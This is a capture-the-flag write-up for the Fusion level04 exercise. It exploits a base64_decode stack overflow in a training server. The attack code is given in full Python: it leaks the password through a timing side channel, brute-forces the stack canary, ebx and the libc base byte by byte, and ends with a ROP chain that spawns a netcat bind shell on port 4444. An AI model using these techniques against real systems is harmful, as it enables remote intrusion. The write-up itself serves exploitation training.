+++
author = "pwntester"
categories = ["CTF", "Fusion", "exploit", "level04"]
date = 2013-12-31T19:00:00Z
description = ""
draft = false
slug = "fusion-level04-write-up"
tags = ["CTF", "Fusion", "exploit", "level04"]
title = "Fusion level04 write-up"

+++

In this [level](http://exploit-exercises.com/fusion/level04) we have to bypass a bunch of protections:

![](/images/octopress/fusion04.png)

The stack based vulnerability is easy to find. It is in the **base64_decode()** function. It takes the output buffer length as an argument, but the it overwrites it with a new value based on the input buffer length. So we are going to be able to control how many bytes we want to write in the output buffer:

```lang-clike line-numbers 
*output_length = input_length / 4 * 3;
```

Now in order to send a valid request we need to provide a password the server generates when it loads but then it reuses for every connection. There is a covert channel leaking how many characters we sent were wrong and we can take advantage of this to get the password. The following script will choose a character based on the response time till it finds the 16 character long password:

```lang-python line-numbers 
#!/usr/bin/python

from socket import *
from struct import *
import base64
import time
import string


def try_password(password):
        credentials = base64.b64encode("stack6:{0}".format(password))
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", 20004))
        request = "GET / HTTP/1.0\r\n"
        request += "Authorization: Basic {0}\r\n".format(credentials)
        request += "\n"
        begin = time.time()
        s.send(request)
        response = s.recv(1024)
        end = time.time()
        s.close()
        return (end-begin, response)

def bruteforce():
        password = ""
        count = 3
        i = 0
        while i<16:
                candidate = ""
                others = 10000000
                response = ""
                for char in string.ascii_letters+string.digits:
                        (time, response) = try_password(password + char)
                        #print("trying {0}, reponse in {1}".format(char, time))
                        if "Unauthorized" not in response:
                                print("Eureka " + password + char)
                                return password + char
                        else:
                                if time < others:
                                        candidate = char
                                        others = time
                password += candidate
                print(password)
                i += 1
passwd = bruteforce()
```

If we run it we will get the passord:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion04.py
B
B0
B0f
B0fN
B0fNG
B0fNGX
B0fNGXy
B0fNGXyn
B0fNGXynX
B0fNGXynX8
B0fNGXynX8i
B0fNGXynX8io
B0fNGXynX8io6
B0fNGXynX8io6G
B0fNGXynX8io6GN
Eureka B0fNGXynX8io6GNO
```

Ok, now we need to smash the stack but there is a canary (SSP) guarding it so we need a way to find out the right canary.

When a server program calls "fork()" to handle a client request but it does not call "execve()" the address space for the child processes will be exactly the same as its parents so the same "canary" value will be reused for every client request.

Fortunately for us, the application will let us know when the canary is wrong or right. Lets just overflow the canary and EIP to verify it:

```lang-python line-numbers 
credentials = base64.b64encode("stack6:{0}".format(passwd))
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20004))
request = "GET / HTTP/1.0\r\n"
request += "Authorization: Basic {0}\r\n".format(credentials + "A"*4096 + "DDDD" + "CCCC")
request += "\n"
s.send(request)
response = s.recv(1024)
print(response)
s.close()
```

And the application kindly let us know that the canary was wrong:

```lang-python line-numbers 
fusion@fusion:~$ python fusion04.py
Eureka B0fNGXynX8io6GNO
HTTP/1.0 200 Ok

*** stack smashing detected ***: /opt/fusion/bin/level04 terminated
```

So we can brute force the canary but first we need to find the canary and EIP offsets:

```lang-python line-numbers 
canary_offset = 2500
while True:
        credentials = base64.b64encode("stack6:{0}".format(passwd))
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", 20004))
        request = "GET / HTTP/1.0\r\n"
        request += "Authorization: Basic {0}\r\n".format(credentials + "A"*canary_offset )
        request += "\n"
        s.send(request)
        response = s.recv(1024)
        s.close()
        if "smashing" in response:
                print("[+] Server response " + response)
                print("[+] Canary offset: " + str(canary_offset))
                break
        canary_offset += 1
```

We find that the canary offset is 2704:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion04.py
[+] Brute forcing password ...
[+] Eureka B0fNGXynX8io6GNO
[+] Searching Canary offset ...
[+] Server response *** stack smashing detected ***: /opt/fusion/bin/level04 terminated
[+] Canary offset: 2704
```

Ok, now we will overwrite the canary one byte at a time until we dont get the "stack smashing detected" message:

```lang-python line-numbers 
canary_offset = 2500
while True:
        credentials = base64.b64encode("stack6:{0}".format(passwd))
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", 20004))
        request = "GET / HTTP/1.0\r\n"
        request += "Authorization: Basic {0}\r\n".format(credentials + "A"*canary_offset )
        request += "\n"
        s.send(request)
        response = s.recv(1024)
        s.close()
        if "smashing" in response:
                print("[+] Server response " + response)
                print("[+] Canary offset: " + str(canary_offset))
                break
        canary_offset += 1
```

We find that the canary offset is 2704:

```lang-python line-numbers 
print("[+] Bruteforcing Canary ...")
canary = ""
for byte in xrange(4):
        for canary_byte in xrange(256):
                hex_byte = chr(canary_byte)
                #print("[+] Trying: {0}{1}".format(canary.encode("hex"), hex_byte.encode("hex")))
                credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + hex_byte))
                s = socket(AF_INET, SOCK_STREAM)
                s.connect(("localhost", 20004))
                request = "GET / HTTP/1.0\r\n"
                request += "Authorization: Basic {0}\r\n".format(credentials)
                request += "\n"
                s.send(request)
                response = s.recv(1024)
                s.close()
                if "smashing" not in response:
                        canary += hex_byte
                        print("[+] Found canary byte: " + hex(canary_byte))
                        break
print("[+] Canary found: " + canary.encode("hex"))
```

Now that we know the SSP canary, we need to know the EIP offset that turns out to be 28 from the canary:

```lang-bash line-numbers 
passwd + "A"*canary_offset + canary + "B"*28 + "DDDD"
```

In gdb:

```lang-bash line-numbers 
(gdb) c
Continuing.
[New process 21459]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 21459]
0x44444444 in ?? ()
```

Also in [PIE]() binaries, the compiler compile the binary as a Position Independent Code (PIC) meaning that it can be run in any memory position. In order to do that, the code needs to remember the offset where the binary has been loaded. Compiler will use **ebx** for this. It will contain the binary load base plus an unknow offset: ebx = load base + offset

The compiler will pop ebx in the function epilogue to pass it to following calls. So if we overwrite the stack dword where **ebx** is popped from, we will confuse the binary and the result will be unpredictable since it wont be able to find the binary load base.

Function epilogue in PIE binaries:

```lang-bash line-numbers 
(gdb) disas validate_credentials
...
0xb785f2b5 <+357>:	pop    %ebx
0xb785f2b6 <+358>:	pop    %esi
0xb785f2b7 <+359>:	pop    %edi
0xb785f2b8 <+360>:	pop    %ebp
0xb785f2b9 <+361>:	ret
...
```

We need to preserve **ebx** so we need to find out its value and we will use the same brute forcing approach but first we need to know the offset of the value that we will pop into ebx in our payload.

```lang-bash line-numbers 
passwd + "A"*canary_offset + canary + "B"*12 + "CCCC" + "B"*12 + "DDDD"
```

In gdb:

```lang-bash line-numbers 
(gdb) c
Continuing.
[New process 22843]

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 22843]
0x44444444 in ?? ()
(gdb) i r ebx
ebx            0x43434343	1128481603
```

Ok now we can bruteforce **ebx** with the following script:

```lang-python line-numbers 
print("[+] Bruteforcing EBX ...")
ebx = ""
for byte in xrange(4):
        for ebx_byte in xrange(256):
                hex_byte = chr(ebx_byte)
                #print("[+] Trying: {0}{1}".format(ebx.encode("hex"), hex_byte.encode("hex")))
                credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + hex_byte))
                try:
                        s = socket(AF_INET, SOCK_STREAM)
                        s.connect(("localhost", 20004))
                        request = "GET / HTTP/1.0\r\n"
                        request += "Authorization: Basic {0}\r\n".format(credentials)
                        request += "\n"
                        s.send(request)
                        response = s.recv(1024)
                        s.close()
                        if "200" in response:
                                ebx += hex_byte
                                print("[+] Found EBX byte: " + hex(ebx_byte))
                                break
                except:
                        pass
print("[+] EBX found: " + ebx.encode("hex"))
```

Script output:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion04.py
[+] Bruteforcing password ...
[+] Eureka W5AbnpNbWfM1586i
[+] Validating password ...
[+] Server response HTTP/1.0 200 Ok
[+] Searching Canary offset. Starting with 2000 ...
[+] Server response *** stack smashing detected ***: /opt/fusion/bin/level04 terminated
[+] Canary offset: 2026
[+] Bruteforcing Canary ...
[+] Found canary byte: 0x0
[+] Found canary byte: 0xce
[+] Found canary byte: 0x76
[+] Found canary byte: 0x13
[+] Canary found: 00ce7613
[+] Bruteforcing EBX ...
[+] Found EBX byte: 0x18
[+] Found EBX byte: 0x11
[+] Found EBX byte: 0x86
[+] Found EBX byte: 0xb7
[+] EBX found: 181186b7
```

Now that we know **ebx** we need to find out the binary load base. We said that ebx = base + offset. Lets use gdb to fid out the value of this offset:

```lang-bash line-numbers 
(gdb) info proc stat
...
Start of text: 0xb785d000
End of text: 0xb7860ad0
Start of stack: 0xbfca0dd0
```

offset = ebx - 0xb785d000

In our previous run ebx was 0xb7861118 so offset is 0x4118:

```lang-bash line-numbers 
(gdb) i r $ebx
ebx            0xb7861118
(gdb) p /x $ebx-0x4118
$1 = 0xb785d000
```

Now kill the server and restart it so that we can run the exploit again and verify that our leaked **ebx** - **0x4118** points to .text:

```lang-bash line-numbers 
(gdb) i r $ebx
ebx            0xb77a9118
(gdb) p /x $ebx-0x4118
$2 = 0xb77a5000
(gdb) info proc stat
...
...
Start of text: 0xb77a5000
End of text: 0xb77a8ad0
Start of stack: 0xbfecd200
```

Nice! We now know the offset where the binary is loaded so we need to weaponize our exploit

My first idea was to use the same technique used in level03: modify GOT entry and then use ret2plt. The problem is that there are no enough gadgets in the binary to modify the GOT reference. Actually, the number of gadgets in our binary is a little depressing :(

```lang-bash line-numbers 
ROPeMe> generate /opt/fusion/bin/level04
Generating gadgets for /opt/fusion/bin/level04 with backward depth=3
It may take few minutes depends on the depth and file size...
Processing code block 1/1
Generated 86 gadgets
```

Next idea is to use gadgets from **libc** but since the server is using ASLR, we need to somehow leak the libc base address with the help of our recently leaked binary load address or brute force it. I will be using the later as I did for [level02](http://www.pwntester.com/blog/2013/12/30/fusion-level02-write-up/)

Note: For the brute force, leaking the binary load address was not required but I tried not to use libc :(

Ok, the whole exploit reusing the ROP chain built for [level02](http://www.pwntester.com/blog/2013/12/30/fusion-level02-write-up/) looks like:

```lang-bash line-numbers 
#!/usr/bin/python

from socket import *
from struct import *
import base64
import time
import string

def try_password(password):
	credentials = base64.b64encode("stack6:{0}".format(password))
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("localhost", 20004))
	request = "GET / HTTP/1.0\r\n"
	request += "Authorization: Basic {0}\r\n".format(credentials)
	request += "\n"
	begin = time.time()
	s.send(request)
	response = s.recv(1024)
	end = time.time()
	s.close()
	return (end-begin, response)

def bruteforce():
	password = ""
	count = 3
	i = 0
	while i<16:
		candidate = ""
		others = 10000000
		response = ""
		for char in string.ascii_letters+string.digits:
			(time, response) = try_password(password + char)
			#print("trying {0}, reponse in {1}".format(char, time))
			if "Unauthorized" not in response:
				print("[+] Eureka " + password + char)
				return password + char
			else:
				if time < others:
					candidate = char
					others = time
		password += candidate
		#print(password)
		i += 1

print("[+] Bruteforcing password ...")
passwd = bruteforce()

print("[+] Validating password ...")
credentials = base64.b64encode("stack6:{0}".format(passwd))
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20004))
request = "GET / HTTP/1.0\r\n"
request += "Authorization: Basic {0}\r\n".format(credentials)
request += "\n"
s.send(request)
response = s.recv(1024)
print("[+] Server response " + response.replace("\n",""))
s.close()

canary_offset = 2000
print("[+] Searching Canary offset. Starting with {0} ...".format(canary_offset))
while True:
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("localhost", 20004))
	credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset))
	request = "GET / HTTP/1.0\r\n"
	request += "Authorization: Basic {0}\r\n".format(credentials)
	request += "\n"
	s.send(request)
	response = s.recv(1024)
	s.close()
	if "smashing" in response:
		print("[+] Server response " + response.replace("\n", ""))
		print("[+] Canary offset: " + str(canary_offset))
		canary_offset -= 1
		break
	canary_offset += 1

print("[+] Bruteforcing Canary ...")
canary = ""
for byte in xrange(4):
	for canary_byte in xrange(256):
		hex_byte = chr(canary_byte)
		#print("[+] Trying: {0}{1}".format(canary.encode("hex"), hex_byte.encode("hex")))
		credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + hex_byte))
		s = socket(AF_INET, SOCK_STREAM)
		s.connect(("localhost", 20004))
		request = "GET / HTTP/1.0\r\n"
		request += "Authorization: Basic {0}\r\n".format(credentials)
		request += "\n"
		s.send(request)
		response = s.recv(1024)
		s.close()
		if "smashing" not in response:
			canary += hex_byte
			print("[+] Found canary byte: " + hex(canary_byte))
			break
print("[+] Canary found: " + canary.encode("hex"))

print("[+] Bruteforcing EBX ...")
ebx = ""
for byte in xrange(4):
	for ebx_byte in xrange(256):
		hex_byte = chr(ebx_byte)
		#print("[+] Trying: {0}{1}".format(ebx.encode("hex"), hex_byte.encode("hex")))
		credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + hex_byte))
		try:
			s = socket(AF_INET, SOCK_STREAM)
			s.connect(("localhost", 20004))
			request = "GET / HTTP/1.0\r\n"
			request += "Authorization: Basic {0}\r\n".format(credentials)
			request += "\n"
			s.send(request)
			response = s.recv(1024)
			s.close()
			if "200" in response:
				ebx += hex_byte
				print("[+] Found EBX byte: " + hex(ebx_byte))
				break
		except:
			pass
print("[+] EBX found: " + ebx.encode("hex"))
base = unpack("<I", ebx)[0] - 0x4118
print("[+] Binary loaded at address: {0}".format(hex(base)))


print("[+] Bruteforcing libc base address")
for off in range(0xb7000000, 0xb8000000, 0x1000):
        p = ''
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c0) # @ .data
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /usr
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c4) # @ .data + 4
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/bin" # /bin
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c8) # @ .data + 8
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /net
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cc) # @ .data + 12
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/ncA" # catA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cf) # @ .data + 15
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-lnp" # -lnp
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d4) # @ .data + 20
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "4444" # 4444
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d8) # @ .data + 24
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-e/b" # -e/b
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789dd) # @ .data + 29
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "in/s" # in/s
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e1) # @ .data + 33
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "hAAA" # hAAA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e2) # @ .data + 34
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e7) # @ .data + 39
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789eb) # @ .data + 43
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x00018f4e) # pop ebx ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        p += pack("<I", off + 0x00001a9e) # pop edx ; ret
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x0002dd35) # int 0x80
	credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + "E"*12 + p))
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("localhost", 20004))
	request = "GET / HTTP/1.0\r\n"
	request += "Authorization: Basic {0}\r\n".format(credentials)
	request += "\n"
	s.send(request)
	s.close()

raw_input("[+] Attach GDB to server process and Press Enter to continue...")
credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + "E"*12 + "DDDD"))
s = socket(AF_INET, SOCK_STREAM)
s.connect(("localhost", 20004))
request = "GET / HTTP/1.0\r\n"
request += "Authorization: Basic {0}\r\n".format(credentials)
request += "\n"
s.send(request)
response = s.recv(1024)
s.close()
```

Now, lets try it:

```lang-bash line-numbers 
fusion@fusion:~$ python fusion04.py
[+] Bruteforcing password ...
[+] Eureka 4D4fqSa0fM477TS5
[+] Validating password ...
[+] Server response HTTP/1.0 200 Ok
[+] Searching Canary offset. Starting with 2000 ...
[+] Server response *** stack smashing detected ***: /opt/fusion/bin/level04 terminated
[+] Canary offset: 2026
[+] Bruteforcing Canary ...
[+] Found canary byte: 0x0
[+] Found canary byte: 0x52
[+] Found canary byte: 0xb9
[+] Found canary byte: 0x57
[+] Canary found: 0052b957
[+] Bruteforcing EBX ...
[+] Found EBX byte: 0x18
[+] Found EBX byte: 0xa1
[+] Found EBX byte: 0x78
[+] Found EBX byte: 0xb7
[+] EBX found: 18a178b7
[+] Binary loaded at address: 0xb7786000L
[+] Bruteforcing libc base address
```

After a couple of minutes the shell will be waiting for us:

```lang-bash line-numbers 
fusion@fusion:~$ sudo netstat -natp | grep LISTEN
tcp        0      0 0.0.0.0:20002           0.0.0.0:*               LISTEN      1017/level02
tcp        0      0 0.0.0.0:20003           0.0.0.0:*               LISTEN      1005/level03
tcp        0      0 0.0.0.0:20004           0.0.0.0:*               LISTEN      29795/level04
tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      963/level05
tcp        0      0 0.0.0.0:20006           0.0.0.0:*               LISTEN      870/level06
tcp        0      0 0.0.0.0:20008           0.0.0.0:*               LISTEN      837/level08
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      691/sshd
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      788/nc
tcp        0      0 0.0.0.0:20000           0.0.0.0:*               LISTEN      1047/level00
tcp        0      0 0.0.0.0:20001           0.0.0.0:*               LISTEN      1031/level01
tcp6       0      0 :::22                   :::*                    LISTEN      691/sshd
fusion@fusion:~$ nc localhost 4444
id
uid=20004 gid=20004 groups=20004
```

Thanks for reading!
